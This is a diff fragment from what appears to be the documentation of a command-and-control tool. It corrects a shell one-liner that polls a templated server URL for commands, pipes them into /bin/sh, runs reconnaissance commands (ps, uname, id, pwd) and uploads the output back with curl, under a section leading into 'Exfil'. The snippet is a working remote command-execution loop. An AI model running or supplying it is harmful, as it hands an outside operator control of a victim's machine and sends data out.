@@ -195,7 +195,7 @@ export PLONK_ID="{{ .RandN }}-$(hostname)-$$"
 (
         echo 'ps awwwfux || ps auxwww; uname -a; id; pwd'
         curl -s --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
-) /bin/sh 2>&1 | curl -sT. "{{ .URL }}/o/$PLONK_ID"
+) | /bin/sh 2>&1 | curl -sT. "{{ .URL }}/o/$PLONK_ID"
 ```
 
 Exfil (`/p`)
